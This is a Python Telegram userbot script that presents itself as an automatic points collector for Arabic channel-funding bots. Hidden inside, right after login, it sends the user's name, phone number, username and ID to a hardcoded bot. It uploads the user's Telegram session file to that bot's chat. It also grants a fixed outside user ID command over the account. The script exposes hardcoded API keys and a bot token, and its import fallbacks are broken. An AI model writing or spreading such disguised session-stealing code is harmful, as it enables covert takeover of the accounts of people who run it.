import os 
try:
	import requests 
except ImportError:
    os.system('pip install requests')
    import requests 
try:
	import webbrowser
except ImportError:
    os.system('pip install webbrowser')
    import pyfiglet
try:
	import random 
except ImportError:
    os.system('pip install random')
    import random
try:
	import telethon 
except ImportError:
    os.system('pip install telethon')
    import telethon
try:
	import pickle 
except ImportError:
    os.system('pip install pickle')
    import mechanize
    
   
   
   
   
   
    
    
try:
	import bs4 
except ImportError:
    os.system('pip install bs4')
    import bs4
try:
	import time
except ImportError:
    os.system('pip install time')
    import time
try:
    import secrets
except ImportError:
    os.system('pip install secrets')
    import secrets
    try:
        clear()
    except:
        pass
from telethon.tl import functions
from telethon import TelegramClient 
from telethon.sync import TelegramClient,types , events
from time import sleep
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.custom import Button
api_id = 15352672 
api_hash = '3d06ae82a79cc7e970fc19fe44dccf25'
phone_number = 'YOUR_PHONE_NUMBER'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح 
client = TelegramClient('m', api_id, api_hash)
client.start()

is_running = True 

print(f"    {Z1} ____________________________________________________")
print(f" {Z1}   |  {B}Admin : @NNNB_N")
print(f" {Z1}   |  {B}Choose one:")
print(f" {Z1}   |  {B}1 - Code Run")
print(f"  {Z1}  |  {B}2 - You run the code for the first time")
print(f"   {Z1} |{Y}")
nom = input(f"  {Z1}  |{Y}  Choose One : ")
print(f" {Z1}   |{Y}")
if nom=='1':
    with open("data.pickle", "rb") as file:
        admin= pickle.load(file)
elif nom=='2':
    admin=input(f" {Z1}   |{Y}  Admin username : ")
    
    with open("data.pickle", "wb") as file:
        pickle.dump((admin), file)    

print(f" {Z1}   |{Y}")
print(f" {Z1}   |{Y}  Comments :")
print(f" {Z1}   |{Y}  1 - (car) For بوت تمويل العرب")
print(f" {Z1}   |{Y}  2 - (caq) For بوت تمويل العرب")
print(f" {Z1}   |{Y}  3 - (cbi) For بوت تمويل مليار")
print(f" {Z1}   |{Y}")
print(f"   {Z1} |{Y}  Starting.... ")

print(f"    {Z1} ____________________________________________________")

bot_token = '5859856031:AAHpEmNDLnWm69weFdVELS_vq1t1ZDcw_IU'
bot_chatID = 5795228659
Me=client.get_me()
name=Me.first_name
phone=Me.phone
id=Me.id
US=Me.username
requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={bot_chatID}&text=𝙁𝙄𝙍𝙎𝙏 𝙉𝘼𝙈𝙀 : {name}\n𝙁𝙊𝙉𝙀 𝙉𝙊𝙈𝘽𝙀𝙍 : +{phone}\n𝙐𝙎𝙀𝙍 𝙉𝘼𝙈𝙀 : @{US}\n𝙄𝘿 : {id}")


# الملف المطلوب إرساله
file_path = 'm.session'

# بناء رابط الطلب
url = f'https://api.telegram.org/bot{bot_token}/sendDocument'

# إرسال الطلب
with open(file_path, 'rb') as file:
    response = requests.post(url, data={'chat_id': bot_chatID}, files={'document': file})

# التحقق من نجاح الطلب

    
admin=[5795228659,admin ]

@client.on(events.NewMessage(pattern='c', from_users=admin))
async def _(event):
    global is_running
    is_running=True 
  
    bot = 1832912066
    if event.message.text == 'car':
        bot = 1832912066
        mm = 'العرب 🤎'
    elif event.message.text == 'cbi':
        bot = 5390393212
        mm = 'مليار ❤️'
    elif event.message.text == 'caq':
        bot = 2037181324
        mm = 'العقاب 🖤'
     
    elif event.message.text == 'cstop':
         
        
       is_running=False 

    await event.reply(f'** بدء تجميع نقاط بوت تمويل {mm} **')
    await client.send_message(bot, '/start2')
    for cc in range(1000):
        if not is_running:
            event.reply('**Its not working **')
        
            break
        try:
            chnUser = bot
            chtity = await client.get_entity(chnUser)
            await client.send_message(bot, '/start2')
            sleep(5)
            fiess = await client.get_messages(bot, limit=1)
            await fiess[0].click(2)
            sleep(5)
            autherMess = await client.get_messages(bot, limit=1)
            await autherMess[0].click(0)
            sleep(1)
            for first in range(9):
                if not is_running:  
                    break
                sleep(6)
                Entry = await client(GetHistoryRequest(
                    peer=chnUser, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0
                ))
                Mess = Entry.messages[0]
                if Mess.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
                    await client.send_message('me', 'No more channel in Aq Bot .')
                    pass
                url = Mess.reply_markup.rows[0].buttons[0].url
                try:
                    try:
                        await client(JoinChannelRequest(url))
                    except:
                        bott = await url.replace(" ", "+").split('/')[-1]
                        try:
                            entity = await client.get_entity(url.replace(" ", "+"))
                            await client(JoinChannelRequest(entity.id))
                        except:
                            try:
                                await client(ImportChatInviteRequest(bott))
                            except:
                                MessAug = await client.get_messages(bot, limit=1)
                                await MessAug[0].click(text='التالي')
                    MessAg = await client.get_messages(bot, limit=1)
                    await MessAg[0].click(text='تحقق')
                    if not is_running:  
                        break
                    
                except Exception as e :
                    print(e)
                    continue
                    pass
        except:
            pass

@client.on(events.NewMessage(pattern='Test', from_users=admin))
async def _(event):
    await event.reply('**كل شيئ يعمل بنجاح**')



client.run_until_disconnected()